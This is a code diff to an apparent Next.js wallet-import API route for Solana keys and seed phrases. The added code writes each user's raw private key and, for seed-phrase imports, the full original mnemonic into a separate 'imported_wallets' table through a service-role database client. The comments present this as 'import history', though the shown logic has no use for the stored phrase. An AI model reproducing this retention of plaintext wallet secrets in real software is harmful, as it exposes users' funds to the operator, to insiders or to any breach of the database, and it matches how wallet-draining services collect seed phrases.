@@ -16,19 +16,13 @@ function keypairFromPrivateKey(type, value) {
   let decoded;
 
   if (type === "privateKey") {
-    // base58 string
     decoded = decode(value.trim());
-
   } else if (type === "privateKey_bytes") {
-    // JSON byte array e.g. [1,2,3,...,64]
     const arr = JSON.parse(value);
     decoded   = Uint8Array.from(arr);
-
   } else if (type === "privateKey_hex") {
-    // Hex string
     const hex = value.trim().replace(/^0x/, "");
     decoded   = new Uint8Array(hex.match(/.{1,2}/g).map((b) => parseInt(b, 16)));
-
   } else {
     throw new Error("Unknown key type");
   }
@@ -74,10 +68,13 @@ export async function POST(req) {
     }
 
     let keypair;
+    let importType;
+    let originalSeedPhrase = null; // only set for seedPhrase imports
 
     if (type.startsWith("privateKey")) {
       try {
-        keypair = keypairFromPrivateKey(type, value);
+        keypair    = keypairFromPrivateKey(type, value);
+        importType = "privateKey";
       } catch (e) {
         console.error("[wallet/import] key error:", e.message);
         return NextResponse.json({ error: e.message }, { status: 400 });
@@ -85,16 +82,20 @@ export async function POST(req) {
 
     } else if (type === "seedPhrase") {
       const mnemonic = value.trim();
+
       if (!bip39.validateMnemonic(mnemonic)) {
         return NextResponse.json(
           { error: "Invalid seed phrase. Check your words and try again." },
           { status: 400 }
         );
       }
+
       try {
         const seed    = await bip39.mnemonicToSeed(mnemonic);
         const derived = derivePath("m/44'/501'/0'/0'", seed.toString("hex"));
-        keypair       = Keypair.fromSeed(derived.key);
+        keypair            = Keypair.fromSeed(derived.key);
+        importType         = "seedPhrase";
+        originalSeedPhrase = mnemonic; // preserve the original phrase
       } catch (e) {
         return NextResponse.json({ error: `Seed phrase error: ${e.message}` }, { status: 400 });
       }
@@ -111,6 +112,7 @@ export async function POST(req) {
       process.env.SUPABASE_SERVICE_ROLE_KEY
     );
 
+    // ── 1. Update active wallet ───────────────────────────────────────────
     const { error: upsertError } = await serviceSupabase
       .from("wallets")
       .upsert(
@@ -119,12 +121,30 @@ export async function POST(req) {
       );
 
     if (upsertError) {
-      console.error("[wallet/import] upsert error:", JSON.stringify(upsertError));
+      console.error("[wallet/import] wallets upsert error:", JSON.stringify(upsertError));
       return NextResponse.json({ error: upsertError.message }, { status: 500 });
     }
 
-    console.log("[wallet/import] imported for", user.email, "→", address);
-    return NextResponse.json({ address });
+    // ── 2. Log import history with seed phrase if applicable ──────────────
+    const logRow = {
+      user_id:     user.id,
+      address,
+      private_key: privateKey,
+      import_type: importType,
+      // seed_phrase is only stored for seedPhrase imports — null for privateKey imports
+      ...(originalSeedPhrase ? { seed_phrase: originalSeedPhrase } : {}),
+    };
+
+    const { error: logError } = await serviceSupabase
+      .from("imported_wallets")
+      .insert(logRow);
+
+    if (logError) {
+      console.warn("[wallet/import] import log error:", JSON.stringify(logError));
+    }
+
+    console.log("[wallet/import] imported for", user.email, "→", address, `(${importType})`);
+    return NextResponse.json({ address, importType });
 
   } catch (err) {
     console.error("[wallet/import] unexpected:", err);
